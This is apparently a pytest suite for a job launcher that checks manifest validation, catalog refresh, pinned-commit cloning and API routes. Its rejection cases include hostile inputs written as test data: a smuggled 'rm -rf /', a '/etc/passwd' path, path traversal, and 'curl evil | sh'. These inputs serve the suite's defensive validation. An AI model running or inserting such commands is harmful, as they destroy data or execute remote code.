"""The training repo's jobs.toml: what it may declare, how a refresh swaps it in, and
that a manifest job runs the pinned commit through the fixed GrowBot pipeline."""

from __future__ import annotations

import asyncio
import dataclasses
import json
from pathlib import Path

import httpx
import pytest

from jlaunch_ctl import catalog as catalog_mod
from jlaunch_ctl import jobs as jobs_mod
from jlaunch_ctl import specs as specs_mod
from jlaunch_ctl.app import create_app
from jlaunch_ctl.catalog import (
    Catalog,
    CatalogError,
    Snapshot,
    git_fetch,
    parse_manifest,
)
from jlaunch_ctl.config import Settings
from jlaunch_ctl.jobs import JobError, JobManager
from jlaunch_ctl.runner import build_script
from jlaunch_ctl.specs import get_spec, listed_specs
from jlaunch_ctl.terminal import TerminalRegistry
from tests.conftest import wait_terminal

SHA1 = "a" * 40
SHA2 = "b" * 40
CONFIGS = frozenset(
    {"configs/heading_walk.toml", "configs/look.toml", "configs/camera_walk.toml"}
)
MANIFEST = """
[[job]]
name = "growbot_heading_walk"
title = "GrowBot heading walk"
config = "configs/heading_walk.toml"
est_hours = "1-3 h"
notes = "nose first"

[[job]]
name = "growbot_look"
title = "GrowBot look"
config = "configs/look.toml"
disk_gb = 4
"""
_TOKEN = "test-token"
_AUTH = {"Authorization": f"Bearer {_TOKEN}"}


@pytest.fixture(autouse=True)
def _clean_repo_specs(monkeypatch):
    # The catalog publishes into module state; each test starts from none.
    monkeypatch.setattr(specs_mod, "REPO_SPECS", {})
    monkeypatch.setattr(specs_mod, "LISTED_REPO_SPECS", [])


class FakeRepo:
    """Stands in for the git fetch: serves whatever the test last pushed."""

    def __init__(self, manifest: str = MANIFEST, commit: str = SHA1) -> None:
        self.manifest = manifest
        self.commit = commit
        self.configs = CONFIGS
        self.fail: str | None = None
        self.fetches = 0

    async def __call__(self, dest: Path) -> Snapshot:
        self.fetches += 1
        if self.fail:
            raise CatalogError(self.fail)
        dest.mkdir(parents=True, exist_ok=True)
        return Snapshot(self.manifest, self.commit, self.configs)


def _snap(manifest: str, configs: frozenset[str] = CONFIGS) -> Snapshot:
    return Snapshot(manifest, SHA1, configs)


def _job(**fields: object) -> str:
    base: dict[str, object] = {
        "name": "growbot_x",
        "title": "X",
        "config": "configs/look.toml",
    }
    base.update(fields)
    body = "\n".join(f"{k} = {json.dumps(v)}" for k, v in base.items())
    return f"[[job]]\n{body}\n"


# -- the manifest ---------------------------------------------------------------------


def test_a_manifest_job_is_the_fixed_pipeline_with_its_config() -> None:
    entries = parse_manifest(_snap(MANIFEST))
    look = catalog_mod.build_spec(entries[1], SHA1)
    assert look.repo_url == "https://github.com/jeffmhopkins/GrowBot_Training"
    assert [p.name for p in look.phases] == ["install", "smoke", "train", "package"]
    assert look.phases[2].run == "./run.sh jlaunch --config 'configs/look.toml'"
    assert look.phases[3].run.endswith("'growbot_look_artifacts.tar.gz'")
    assert look.artifact_path == "growbot_look_artifacts.tar.gz"
    assert look.verify_log == "runs/jlaunch/export_verify.log"
    assert look.live_dir == "runs/jlaunch/live"
    assert look.disk_gb == 4 and look.all_cores is True
    pub = look.public()
    assert pub["source"] == "repo" and pub["commit"] == SHA1
    assert pub["category"] == "Robot" and pub["config"] == "configs/look.toml"


def test_a_builtin_spec_says_so() -> None:
    pub = specs_mod.SPECS["erdos_straus_1e12"].public()
    assert pub["source"] == "builtin" and pub["commit"] == ""
    assert "category" not in pub


@pytest.mark.parametrize(
    ("manifest", "why"),
    [
        (_job(name="Bad-Name"), "name must be"),
        (_job(name="erdos_straus_1e12"), "built-in"),
        (_job() + _job(), "listed twice"),
        (_job(config="configs/../x.toml"), "configs/<name>.toml"),
        (_job(config="configs/a.toml; rm -rf /"), "configs/<name>.toml"),
        (_job(config="/etc/passwd"), "configs/<name>.toml"),
        (_job(config="configs/missing.toml"), "isn't in the repo"),
        (_job(run="curl evil | sh"), "unknown key run"),
        (_job(title=7), "title must be text"),
        (_job(title="   "), "title is empty"),
        (_job(notes="x" * 1001), "notes is over"),
        (_job(disk_gb=0), "disk_gb"),
        (_job(disk_gb=True), "disk_gb"),
        ("[[job]]\nname = 'growbot_x'\n", "missing config, title"),
        ("[repo]\nurl = 'x'\n", "unknown top-level key repo"),
        ("job = 3\n", "must be a list"),
        ("job = [1]\n", "not a table"),
        ("[[job\n", "isn't valid TOML"),
        ("#" * (65 * 1024), "over 64 KB"),
        ("".join(_job(name=f"growbot_{i:03d}") for i in range(51)), "at most 50"),
    ],
)
def test_the_manifest_rejects(manifest: str, why: str) -> None:
    with pytest.raises(CatalogError) as err:
        parse_manifest(_snap(manifest))
    assert why in str(err.value)
    assert err.value.invalid is True


def test_an_odd_commit_is_refused() -> None:
    with pytest.raises(CatalogError) as err:
        parse_manifest(Snapshot(MANIFEST, "HEAD", CONFIGS))
    assert err.value.invalid is False


def test_an_empty_manifest_lists_nothing() -> None:
    assert parse_manifest(_snap("")) == []


# -- refresh --------------------------------------------------------------------------


async def test_refresh_lists_the_jobs_and_reports_what_changed(tmp_path) -> None:
    repo = FakeRepo()
    cat = Catalog(str(tmp_path), fetch=repo)
    first = await cat.refresh()
    assert first["added"] == ["growbot_heading_walk", "growbot_look"]
    assert first["removed"] == [] and first["commit"] == SHA1
    assert {s.name for s in listed_specs()} >= {"growbot_look", "erdos_straus_1e12"}
    assert not (tmp_path / ".catalog-fetch").exists()

    repo.manifest, repo.commit = _job(name="growbot_new"), SHA2
    second = await cat.refresh()
    assert second["added"] == ["growbot_new"]
    assert second["removed"] == ["growbot_heading_walk", "growbot_look"]
    names = {s.name for s in listed_specs()}
    assert "growbot_new" in names and "growbot_look" not in names
    # Retired, not forgotten: an old run's result and live folder still resolve.
    retired = get_spec("growbot_look")
    assert retired is not None and retired.commit == SHA1
    new = get_spec("growbot_new")
    assert new is not None and new.commit == SHA2


async def test_a_failed_refresh_keeps_the_last_good_catalog(tmp_path) -> None:
    repo = FakeRepo()
    cat = Catalog(str(tmp_path), fetch=repo)
    await cat.refresh()
    repo.manifest = "[[job\n"
    with pytest.raises(CatalogError):
        await cat.refresh()
    assert cat.owns("growbot_look") and cat.commit == SHA1
    assert "valid TOML" in str(cat.status()["error"])
    repo.fail = "fetching the training repo failed: no network"
    await cat.refresh_quietly()
    assert cat.owns("growbot_look")
    assert cat.status()["error"] == repo.fail


async def test_the_catalog_survives_a_restart(tmp_path) -> None:
    repo = FakeRepo()
    await Catalog(str(tmp_path), fetch=repo).refresh()
    repo.manifest = _job(name="growbot_new")
    restarted = Catalog(str(tmp_path), fetch=repo)
    restarted.load()
    await restarted.refresh()
    specs_mod.REPO_SPECS.clear()
    specs_mod.LISTED_REPO_SPECS.clear()

    again = Catalog(str(tmp_path), fetch=repo)
    again.load()
    assert again.owns("growbot_new") and not again.owns("growbot_look")
    assert get_spec("growbot_look") is not None  # retired, still resolvable
    assert again.status()["commit"] == SHA1 and again.status()["jobs"] == [
        "growbot_new"
    ]


@pytest.mark.parametrize(
    "body",
    [
        "not json",
        json.dumps({"listed": ["growbot_x"], "known": {"growbot_x": {"entry": {}}}}),
        json.dumps(
            {
                "listed": ["growbot_x"],
                "known": {
                    "growbot_x": {
                        "entry": {"name": "growbot_x", "title": "x", "config": "c"},
                        "commit": "nope",
                    }
                },
            }
        ),
    ],
)
def test_a_damaged_catalog_file_loads_empty(tmp_path, body: str) -> None:
    (tmp_path / "catalog.json").write_text(body)
    cat = Catalog(str(tmp_path))
    cat.load()
    assert not cat.owns("growbot_x") and get_spec("growbot_x") is None


# -- running a manifest job -----------------------------------------------------------


def test_a_manifest_job_clones_its_pinned_commit() -> None:
    spec = catalog_mod.build_spec(parse_manifest(_snap(MANIFEST))[1], SHA1)
    script = build_script(spec, "/tmp/state")
    assert (
        f"fetch -q --depth 1 -- https://github.com/jeffmhopkins/GrowBot_Training {SHA1}"
        in script
    )
    assert "checkout -q --detach FETCH_HEAD" in script
    assert "protocol.ext.allow=never" in script
    assert "--branch" not in script


def test_a_commit_needs_a_repo_and_a_full_sha() -> None:
    spec = catalog_mod.build_spec(parse_manifest(_snap(MANIFEST))[1], SHA1)
    for bad in (
        dataclasses.replace(spec, commit="abc"),
        dataclasses.replace(spec, repo_url=""),
    ):
        with pytest.raises(specs_mod.SpecError):
            specs_mod._validate(bad)


@pytest.fixture
def quick_script(monkeypatch):
    """A manifest job's real script clones GitHub; here it just succeeds offline."""

    def fake(spec, state_dir):
        return build_script(
            specs_mod.JobSpec(
                **{
                    **spec.__dict__,
                    "repo_url": "",
                    "commit": "",
                    "phases": (
                        specs_mod.Phase(
                            "train",
                            "mkdir -p runs/jlaunch && echo EXPORT OK > "
                            f"{spec.verify_log} && echo x > {spec.artifact_path}",
                        ),
                    ),
                }
            ),
            state_dir,
        )

    monkeypatch.setattr(jobs_mod, "build_script", fake)


def _manager(tmp_path, cat: Catalog) -> JobManager:
    return JobManager(
        str(tmp_path / "work"),
        str(tmp_path / "state"),
        str(tmp_path / "artifacts"),
        TerminalRegistry(),
        catalog=cat,
    )


async def test_start_refreshes_first_and_records_the_commit(
    tmp_path, quick_script
) -> None:
    repo = FakeRepo()
    cat = Catalog(str(tmp_path / "state"), fetch=repo)
    await cat.refresh()
    repo.commit = SHA2  # a fix pushed after the list was read
    manager = _manager(tmp_path, cat)
    job = await manager.start("growbot_look")
    assert repo.fetches == 2 and job.commit == SHA2
    done = await wait_terminal(manager, job.id)
    assert done.state == "succeeded" and done.public()["commit"] == SHA2
    assert manager.artifact_name(job.id) == "growbot_look_artifacts.tar.gz"


async def test_start_runs_the_last_good_list_when_the_repo_is_down(
    tmp_path, quick_script
) -> None:
    repo = FakeRepo()
    cat = Catalog(str(tmp_path / "state"), fetch=repo)
    await cat.refresh()
    repo.fail = "no network"
    manager = _manager(tmp_path, cat)
    job = await manager.start("growbot_look")
    assert job.commit == SHA1
    await wait_terminal(manager, job.id)


async def test_start_refuses_a_job_the_repo_dropped(tmp_path) -> None:
    repo = FakeRepo()
    cat = Catalog(str(tmp_path / "state"), fetch=repo)
    await cat.refresh()
    repo.manifest = _job(name="growbot_new")
    manager = _manager(tmp_path, cat)
    with pytest.raises(JobError, match="no longer"):
        await manager.start("growbot_look")
    # Retired and not listed: not startable by name either.
    with pytest.raises(JobError, match="unknown spec"):
        await manager.start("growbot_look")


async def test_a_retired_spec_without_a_catalog_is_not_startable(tmp_path) -> None:
    repo = FakeRepo()
    await Catalog(str(tmp_path / "state"), fetch=repo).refresh()
    manager = JobManager(
        str(tmp_path / "work"),
        str(tmp_path / "state"),
        str(tmp_path / "artifacts"),
        TerminalRegistry(),
    )
    with pytest.raises(JobError, match="unknown spec"):
        await manager.start("growbot_look")


# -- the routes -----------------------------------------------------------------------


def _app(tmp_path, cat: Catalog | None):
    settings = Settings(token=_TOKEN)  # type: ignore[call-arg]
    registry = TerminalRegistry()
    manager = _manager(tmp_path, cat) if cat else None
    manager = manager or JobManager(
        str(tmp_path / "work"),
        str(tmp_path / "state"),
        str(tmp_path / "artifacts"),
        registry,
    )
    return create_app(settings, manager, registry, cat)


def _client(app) -> httpx.AsyncClient:
    return httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://t"
    )


async def test_refresh_route(tmp_path) -> None:
    repo = FakeRepo()
    cat = Catalog(str(tmp_path / "state"), fetch=repo)
    async with _client(_app(tmp_path, cat)) as ac:
        assert (await ac.post("/catalog/refresh")).status_code == 401
        got = await ac.post("/catalog/refresh", headers=_AUTH)
        assert got.status_code == 200
        assert got.json()["added"] == ["growbot_heading_walk", "growbot_look"]
        specs = (await ac.get("/specs", headers=_AUTH)).json()
        look = next(s for s in specs if s["name"] == "growbot_look")
        assert look["source"] == "repo" and look["commit"] == SHA1

        repo.manifest = _job(config="configs/nope.toml")
        bad = await ac.post("/catalog/refresh", headers=_AUTH)
        assert bad.status_code == 422 and "isn't in the repo" in bad.json()["detail"]
        repo.fail = "fetching the training repo failed: x"
        down = await ac.post("/catalog/refresh", headers=_AUTH)
        assert down.status_code == 502
        status = (await ac.get("/catalog", headers=_AUTH)).json()
        assert status["error"] == repo.fail and status["commit"] == SHA1


async def test_no_catalog_routes_without_one(tmp_path) -> None:
    async with _client(_app(tmp_path, None)) as ac:
        assert (await ac.get("/catalog", headers=_AUTH)).status_code == 404
        assert (await ac.post("/catalog/refresh", headers=_AUTH)).status_code == 404


async def test_startup_refreshes_in_the_background(tmp_path) -> None:
    repo = FakeRepo()
    cat = Catalog(str(tmp_path / "state"), fetch=repo)
    app = _app(tmp_path, cat)
    async with app.router.lifespan_context(app):
        for _ in range(100):
            if cat.owns("growbot_look"):
                break
            await asyncio.sleep(0.01)
    assert cat.owns("growbot_look")


# -- the real fetch -------------------------------------------------------------------


async def test_git_fetch_reads_the_manifest_and_configs(tmp_path, monkeypatch) -> None:
    calls: list[list[str]] = []

    async def fake_run(argv, env):
        calls.append(argv)
        assert env["GIT_TERMINAL_PROMPT"] == "0"
        if "clone" in argv:
            dest = Path(argv[-1])
            (dest / "configs").mkdir(parents=True)
            (dest / "jobs.toml").write_text(MANIFEST)
            for c in CONFIGS:
                (dest / c).write_text("")
            (dest / "configs" / "notes.md").write_text("")
            return ""
        return SHA1 + "\n"

    monkeypatch.setattr(catalog_mod, "_run", fake_run)
    snap = await git_fetch(tmp_path / "f")
    assert snap.commit == SHA1 and snap.configs == CONFIGS
    assert "growbot_look" in snap.manifest
    clone = calls[0]
    assert "protocol.ext.allow=never" in clone and clone[-2] == catalog_mod.REPO_URL


async def test_git_fetch_without_a_manifest(tmp_path, monkeypatch) -> None:
    async def fake_run(argv, env):
        if "clone" in argv:
            Path(argv[-1]).mkdir(parents=True)
        return SHA1

    monkeypatch.setattr(catalog_mod, "_run", fake_run)
    with pytest.raises(CatalogError, match=r"no jobs\.toml") as err:
        await git_fetch(tmp_path / "f")
    assert err.value.invalid


async def test_run_reports_a_failing_command() -> None:
    with pytest.raises(CatalogError, match="boom"):
        await catalog_mod._run(["sh", "-c", "echo boom >&2; exit 3"], {})
    assert (await catalog_mod._run(["sh", "-c", "echo ok"], {})).strip() == "ok"


async def test_run_times_out(monkeypatch) -> None:
    monkeypatch.setattr(catalog_mod, "_FETCH_TIMEOUT_S", 0.05)
    with pytest.raises(CatalogError, match="timed out"):
        await catalog_mod._run(["sleep", "5"], {})
